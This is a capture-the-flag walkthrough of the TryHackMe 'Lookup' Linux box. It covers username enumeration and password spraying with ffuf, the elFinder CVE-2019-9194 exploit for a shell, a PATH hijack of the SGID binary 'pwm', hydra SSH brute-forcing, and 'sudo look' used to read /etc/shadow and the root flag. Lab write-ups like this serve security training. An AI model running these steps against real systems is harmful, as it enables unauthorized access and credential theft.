---
title: "Lookup"
type: docs
tags:
  - thm
  - linux
  - easy
  - elfinder
  - cve-2019-9194
  - path-hijack
  - sudo
  - gtfobins
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Easy, **IP:** lookup.thm

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Login form leaks valid usernames via response-size differences → `admin`, `jose`. Password-spray `rockyou` → `jose`'s password.
2. `jose` redirects to `files.lookup.thm` running **elFinder 2.1.47** → **CVE-2019-9194** command injection ([EDB 46481](https://www.exploit-db.com/exploits/46481)) → shell as `www-data`.
3. SGID binary **`pwm`** runs `id` from `$PATH` and prints `/home/think/.passwords`. Hijack `id` with a fake one returning `think` → dump the password list → `hydra` SSH brute → **think**.
4. `think` may `sudo /usr/bin/look` → [GTFOBins look](https://gtfobins.github.io/gtfobins/look/#sudo) to read `/etc/shadow` and `/root/root.txt`.

</div>

---

## Full Walkthrough

### Nmap Scan

```bash
Host is up, received user-set (0.086s latency).
Scanned at 2025-05-19 18:33:42 EDT for 518s
Not shown: 58898 closed tcp ports (conn-refused), 6635 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-headers: 
|   Date: Mon, 19 May 2025 22:42:19 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Location: http://lookup.thm
|   Content-Length: 0
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: GET)
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

The website seems to return a login page it is a very basic website I am going to attempt to fund users with `ffuf`.


```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d "username=FUZZ&password=admin" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php -c  --fs 74
```

![Pasted image 20250519192834](Pasted-image-20250519192834.png)

```
admin
jose
```

### Logging into website

I was able to find credentials for the user `jose` it is a `302 Redirect` to the subdomain `files.lookup.thm`

```bash
 ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -d "username=jose&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php -c   --fs 62 
```

![Pasted image 20250519193054](Pasted-image-20250519193054.png)

The website seem to be a file hosting website running `ElFinder` which I tried to search for known exploits.

![Pasted image 20250519193310](Pasted-image-20250519193310.png)

```bash
└─[$] searchsploit -m php/webapps/46481.py                                                                         [19:32:16]
  Exploit: elFinder 2.1.47 - 'PHP connector' Command Injection
      URL: https://www.exploit-db.com/exploits/46481
     Path: /opt/exploitdb/exploits/php/webapps/46481.py
    Codes: CVE-2019-9194
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/anarchy/thm/boxes/Lookup/46481.py
```

![Pasted image 20250519193642](Pasted-image-20250519193642.png)

now we have a shell!

#### Enumerating the system

Looking through my logs from `linpeas` I found an interesting `SGID` binary called `pwm` which when executed gives the following output.

![Pasted image 20250519202117](Pasted-image-20250519202117.png)

in the user `think` directory they have a file called `.passwords` maybe we can get the contents of their file with this. It extracts the user from the command ID which we can create our own `id` binary to give the output of the user `think`

```bash
#!/bin/bash

echo "uid=33(think) gid=33(think) groups=33(think)"
```

```bash
(remote) www-data@lookup:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
(remote) www-data@lookup:/tmp$ export PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin"
```

```bash
(remote) www-data@lookup:/tmp$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

From there I used `hydra` to bruteforce the password.

```bash
hydra -l think -P passwords.lst ssh://lookup.thm -I
```

![Pasted image 20250519202800](Pasted-image-20250519202800.png)

#### Privesc to root

```bash
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
think@lookup:~$ josemario.AKA(think)^C
think@lookup:~$ LFILE=/etc/shadow
think@lookup:~$ sudo look $LFILE
look: /usr/share/dict/words: No such file or directory
think@lookup:~$ echo $LFILE
/etc/shadow
think@lookup:~$ sudo look '' "$LFILE"
root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::
daemon:*:19046:0:99999:7:::
bin:*:19046:0:99999:7:::
sys:*:19046:0:99999:7:::
sync:*:19046:0:99999:7:::
games:*:19046:0:99999:7:::
man:*:19046:0:99999:7:::
lp:*:19046:0:99999:7:::
mail:*:19046:0:99999:7:::
news:*:19046:0:99999:7:::
uucp:*:19046:0:99999:7:::
proxy:*:19046:0:99999:7:::
www-data:*:19046:0:99999:7:::
backup:*:19046:0:99999:7:::
list:*:19046:0:99999:7:::
irc:*:19046:0:99999:7:::
gnats:*:19046:0:99999:7:::
nobody:*:19046:0:99999:7:::
systemd-network:*:19046:0:99999:7:::
systemd-resolve:*:19046:0:99999:7:::
systemd-timesync:*:19046:0:99999:7:::
messagebus:*:19046:0:99999:7:::
syslog:*:19046:0:99999:7:::
_apt:*:19046:0:99999:7:::
tss:*:19046:0:99999:7:::
uuidd:*:19046:0:99999:7:::
tcpdump:*:19046:0:99999:7:::
landscape:*:19046:0:99999:7:::
pollinate:*:19046:0:99999:7:::
usbmux:*:19510:0:99999:7:::
sshd:*:19510:0:99999:7:::
systemd-coredump:!!:19510::::::
lxd:!:19510::::::
think:$6$Cqt14LKfnwO1hA/a$c/g4M9yiP1KGJtbiOS4zubpw2.sm4bPfCglqddPpUS615xwwsU4eg1q.nr6UDLppea8AlmJ5fQUUewLICNU371:19568:0:99999:7:::
fwupd-refresh:*:19510:0:99999:7:::
mysql:!:19568:0:99999:7:::
```

```bash
think@lookup:~$ LFILE=/root/root.txt
think@lookup:~$ sudo look '' "$LFILE"
5a285a9f257e45c68bb6c9f9f57d18e8
think@lookup:~$ 
```
